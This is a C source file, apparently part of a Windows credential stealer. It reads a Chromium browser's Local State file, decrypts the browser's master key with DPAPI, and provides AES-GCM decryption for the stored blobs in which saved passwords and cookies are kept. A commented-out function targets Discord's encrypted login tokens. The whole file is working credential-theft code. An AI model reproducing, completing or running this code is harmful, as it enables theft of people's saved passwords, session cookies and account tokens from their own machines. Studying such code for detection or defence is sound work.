#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "../../dependencies/libsodium-win64/include/sodium.h"
#include "../../include/thirdparty/cJSON.h"

DATA_BLOB DecryptBrowserKey(const char *localstatePath)
{

    HMODULE hCrypt = LoadLibraryA("crypt32.dll");

    if (hCrypt == NULL)
    {
        printf("[-] Failed to load crypt32.");
        printf("Error: %u\n", GetLastError());
    }
    typedef BOOL(WINAPI * BASE64D)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *);
    BASE64D pCryptStringToBinaryA = (BASE64D)GetProcAddress(hCrypt, "CryptStringToBinaryA");

    typedef BOOL(WINAPI * UNPROTECTED)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, CRYPTPROTECT_PROMPTSTRUCT *, DWORD, DATA_BLOB *);

    UNPROTECTED pCryptUnprotectData = (UNPROTECTED)GetProcAddress(hCrypt, "CryptUnprotectData");

    FILE *localStateFile = fopen(localstatePath, "r");
    if (localStateFile == NULL)
    {
        // printf("[-] Error: Unable to open Local State\n");
        DATA_BLOB empty = {0};
        return empty;
    }

    // Read the entire file in to a buffer
    fseek(localStateFile, 0, SEEK_END);
    long localStateSize = ftell(localStateFile);
    fseek(localStateFile, 0, SEEK_SET);

    //
    char *localStateBuffer = (char *)malloc(localStateSize + 1);
    fread(localStateBuffer, 1, localStateSize, localStateFile);
    localStateBuffer[localStateSize] = '\0';
    fclose(localStateFile);

    cJSON *localStateJsonRoot = cJSON_Parse(localStateBuffer);
    // if (localStateJsonRoot == NULL) {
    //     const char *error_ptr = cJSON_GetErrorPtr();
    //     if (error_ptr != NULL) {
    //         fprintf(stderr, "Error before: %s\n", error_ptr);
    //     }
    //     cJSON_Delete(localStateJsonRoot);
    //     free(localStateBuffer);
    // }

    if (localStateJsonRoot == NULL)
    {
        free(localStateBuffer);
        FreeLibrary(hCrypt);
        DATA_BLOB empty = {0};
        return empty; // immediate clean exit
    }
    // char *encryptedKey = localStateJsonRoot->child->next->next->next->next->next->next->next->next->next->next->next->child->next->next->valuestring;
    cJSON *os_crypt = cJSON_GetObjectItem(localStateJsonRoot, "os_crypt");
    cJSON *key_value_object = cJSON_GetObjectItem(os_crypt, "encrypted_key");
    if (!key_value_object)
    {
        printf("[-] Failed to find encrypted_key in JSON\n");
    }
    char *encryptedKey = key_value_object->valuestring; // String not a binary yet

    int encryptedKeySize = strlen(encryptedKey);

    // printf("[!] Encrypted Key: %s\n", encryptedKey );
    // printf("[!] Size: %i\n", encryptedKeySize );

    BYTE *b64decodedKey = NULL; // Raw binary
    DWORD binarySize = 0;       // Decoded binary size
    DWORD pdwSkip = 0;          // Required by function
    DWORD pdwFlags = 0;         // Required by function

    // Getting binary buffer size.

    if (!pCryptStringToBinaryA(
            encryptedKey,        // base64 string in *encryptedKey
            0,                   // we want to automatically detect the length
            CRYPT_STRING_BASE64, // input format
            NULL,                // no output buffer (so only tell me the size)
            &binarySize,         // asking windows how big the output will be
            &pdwSkip,            // optional
            &pdwFlags            // optional
            ))
    {
        printf("Error decoding base64 string [first step.]\n Error: %ld\n", GetLastError());
    }
    b64decodedKey = (BYTE *)malloc(binarySize);

    if (b64decodedKey == NULL)
    {
        printf("[-] Couldn't allocate memory. \n");
    }

    // Decoding the base64 string in "encrypted_key"
    if (!pCryptStringToBinaryA(
            encryptedKey,
            0,
            CRYPT_STRING_BASE64,
            b64decodedKey,
            &binarySize,
            &pdwSkip,
            &pdwFlags))
    {
        printf("Error converting string to binary [second step.]: %lu\n", GetLastError());
        free(b64decodedKey);
    }

    DATA_BLOB DataInput;
    DataInput.pbData = b64decodedKey + 5;

    DataInput.cbData = binarySize - 5;
    DATA_BLOB DataOutput = {0};
    if (!pCryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput))
    {
        printf("Error decrypting data. Error %ld", GetLastError());
        LocalFree(DataOutput.pbData);
    }

    cJSON_Delete(localStateJsonRoot);
    free(localStateBuffer);
    free(b64decodedKey);
    FreeLibrary(hCrypt);
    // LocalFree(DataOutput.pbData);

    return DataOutput;
}
// int DecryptDiscordKey(char *encrypted_token, const char *discordlocalstatePath)
// {

//     HMODULE hCrypt = LoadLibraryA("crypt32.dll");

//     if (hCrypt == NULL)
//     {
//         printf("[-] Failed to load crypt32.");
//         printf("Error: %u\n", GetLastError());
//     }
//     typedef BOOL(WINAPI * BASE64D)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *);
//     BASE64D pCryptStringToBinaryA = (BASE64D)GetProcAddress(hCrypt, "CryptStringToBinaryA");

//     typedef BOOL(WINAPI * UNPROTECTED)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, CRYPTPROTECT_PROMPTSTRUCT *, DWORD, DATA_BLOB *);

//     UNPROTECTED pCryptUnprotectData = (UNPROTECTED)GetProcAddress(hCrypt, "CryptUnprotectData");

//     FILE *localStateFile = fopen(discordlocalstatePath, "r");
//     if (localStateFile == NULL)
//     {
//         // printf("[-] Error: Unable to open Local State\n");
//         DATA_BLOB empty = {0};
//         return empty;
//     }

//     // Read the entire file in to a buffer
//     fseek(localStateFile, 0, SEEK_END);
//     long localStateSize = ftell(localStateFile);
//     fseek(localStateFile, 0, SEEK_SET);

//     //
//     char *localStateBuffer = (char *)malloc(localStateSize + 1);
//     fread(localStateBuffer, 1, localStateSize, localStateFile);
//     localStateBuffer[localStateSize] = '\0';
//     fclose(localStateFile);

//     // if (localStateJsonRoot == NULL) {
//     //     const char *error_ptr = cJSON_GetErrorPtr();
//     //     if (error_ptr != NULL) {
//     //         fprintf(stderr, "Error before: %s\n", error_ptr);
//     //     }
//     //     cJSON_Delete(localStateJsonRoot);
//     //     free(localStateBuffer);
//     // }
//     if (!key_value_object)
//     {
//         printf("[-] Failed to find encrypted_key in JSON\n");
//     }

//     encrypted_token += strlen("dQw4w9WgXcQ:");
//     ;
//     int encryptedKeySize = strlen(encrypted_token);

//     printf("[!] Encrypted Key: %s\n", encryptedKey);
//     printf("[!] Size: %i\n", encryptedKeySize);

//     BYTE *b64decodedKey = NULL; // Raw binary
//     DWORD binarySize = 0;       // Decoded binary size
//     DWORD pdwSkip = 0;          // Required by function
//     DWORD pdwFlags = 0;         // Required by function

//     // Getting binary buffer size.

//     if (!pCryptStringToBinaryA(
//             encryptedKey,        // base64 string in *encryptedKey
//             0,                   // we want to automatically detect the length
//             CRYPT_STRING_BASE64, // input format
//             NULL,                // no output buffer (so only tell me the size)
//             &binarySize,         // asking windows how big the output will be
//             &pdwSkip,            // optional
//             &pdwFlags            // optional
//             ))
//     {
//         printf("Error decoding base64 string [first step.]\n Error: %ld\n", GetLastError());
//     }
//     b64decodedKey = (BYTE *)malloc(binarySize);

//     if (b64decodedKey == NULL)
//     {
//         printf("[-] Couldn't allocate memory. \n");
//     }

//     // Decoding the base64 string in "encrypted_key"
//     if (!pCryptStringToBinaryA(
//             encryptedKey,
//             0,
//             CRYPT_STRING_BASE64,
//             b64decodedKey,
//             &binarySize,
//             &pdwSkip,
//             &pdwFlags))
//     {
//         printf("Error converting string to binary [second step.]: %lu\n", GetLastError());
//         free(b64decodedKey);
//     }

//     DATA_BLOB DataInput;
//     DataInput.pbData = b64decodedKey + 5;

//     DataInput.cbData = binarySize - 5;
//     DATA_BLOB DataOutput = {0};
//     if (!pCryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput))
//     {
//         printf("Error decrypting data. Error %ld", GetLastError());
//         LocalFree(DataOutput.pbData);
//     }

//     free(localStateBuffer);
//     free(b64decodedKey);
//     FreeLibrary(hCrypt);
//     // LocalFree(DataOutput.pbData);

//     return 0;
// }

void DecryptBlob(unsigned char *ciphertext, size_t ciphertext_length, unsigned char *key, unsigned char *iv, unsigned char *decrypted)
{

    unsigned long long decrypted_length;

    int result = crypto_aead_aes256gcm_decrypt(
        decrypted, &decrypted_length,
        NULL,
        ciphertext, ciphertext_length,
        NULL, 0,
        iv, key);

    if (result != 0)
    {
        printf("[-] Decryption failed \n");
    }
    else
    {
        decrypted[decrypted_length] = '\0';
    }
}
